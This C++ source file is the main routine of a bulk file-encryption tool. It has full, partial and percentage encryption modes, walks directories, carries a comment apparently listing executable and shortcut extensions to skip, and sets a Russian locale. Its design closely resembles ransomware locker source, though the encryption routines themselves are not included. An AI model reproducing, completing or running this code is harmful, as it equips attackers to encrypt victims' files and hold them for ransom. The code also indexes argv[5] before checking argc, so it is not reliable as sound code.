#include "api.h"
#include <chrono>
#include "filesystem.hpp"
#include "pathsystem.hpp"
#include "common.h"
#include "global_parameters.h"

STATIC INT g_EncryptMode = FULL_ENCRYPT;
STATIC INT g_Percent = 20;
STATIC BOOL g_Status = FALSE;


STATIC int my_stoi(const char* str) 
{	
	unsigned int strLen = memory::StrLen(str);
	int num = 0;
	int ten;	
	for (int i = 0; i < strLen; ++i) 
	{
		ten = 1;
		for (unsigned int j = 0; j < strLen - 1 - i; ++j) 
		{
			ten *= 10;
		}

		num += ten * (str[i] - '0');
	}

	return num;
}


// .lnk, .exe, .dll, .sys, .msi, .bat
//"key_setupppppppppp" "1488888888888"
void usage_guide();
int main(int argc, const char* argv[])
{
	setlocale(LC_ALL, "Rus");
	if (argc == 1)
	{
		usage_guide();
		return EXIT_SUCCESS;
	}
	api::InitializeApiModule();
	ECRYPT_init();	


	std::clock_t start;
	double duration;
	start = std::clock();
	
	if (argv[5] != NULL && argc > 4)
	{
		if (memory::StrStrC(argv[5], "-f"))
		{
			g_EncryptMode = FULL_ENCRYPT;
			global::SetEncryptMode(g_EncryptMode);
		}
		else if (memory::StrStrC(argv[5], "-p"))
		{
			g_EncryptMode = PARTLY_ENCRYPT;
			global::SetEncryptMode(g_EncryptMode);
		}
		else if (memory::StrStrC(argv[5], "-d"))
		{
			g_EncryptMode = PARTLYPERCENT_ENCRYPT;
			if (argv[6] != NULL && my_stoi(argv[6]) == 50)
				g_Percent = 50;
			global::SetEncryptMode(g_EncryptMode);
			global::SetPercent(g_Percent);
		}
		else if (memory::StrStrC(argv[5], "-read"))
		{
			g_Status = TRUE;
			global::SetStatus(g_Status);
		}		
	}


	
	/*  */
	CHAR* s = (CHAR*)memory::m_new(6);
	memory::m_memcpy(s, argv[1], 5);
	s[5] = '\0';
	if (memory::StrStrC(s, "enum:"))
	{
		INT lena = memory::StrLen(argv[1]) - 5;
		CHAR* c = (CHAR*)memory::m_new(lena);
		memory::m_memcpy(c, &argv[1][5], lena);
		INT i;
		INT Count = 0;		
		CHAR* buf;
		do
		{
			i = memory::FindCharI(&c[Count], '$');
			if (i == 0)
			{		
				buf = (CHAR*)memory::m_new(lena - Count + 1);				
				memory::m_memcpy(buf, &c[Count], lena - Count + 1);				
				argv[1] = buf;
				printf_s("Start enum: %s\n", argv[1]);								
				pathsystem::StartLocalSearch(argv);
				break;
			}			
			buf = (CHAR*)memory::m_new(i);
			memory::m_memcpy(buf, &c[Count], i);
			buf[i - 1] = '\0';
			argv[1] = buf;
			printf_s("Start enum: %s\n", argv[1]);
			pathsystem::StartLocalSearch(argv);
			Count += i;
		} while (TRUE);
		memory::m_delete(buf);
		memory::m_delete(c);
	}
	else
	{
		pathsystem::StartLocalSearch(argv);
	}
	
	printf_s("\nCOMPLETE\n");
	duration = (std::clock() - start) / (float)CLOCKS_PER_SEC;
	printf_s("lead time: %f\n", duration);	

	memory::m_delete(s);
	return EXIT_SUCCESS;
}

void usage_guide()
{
	std::cout << "usage:\t[path]\t[action]\t[key_setup]\t[ivBits]\n";
	std::cout << "\taction [-file], [-dir], [-indir]\n";
	std::cout << "\t[path]\tpath directory or path file\n";
	std::cout << "\t~file must be not empty\n";
}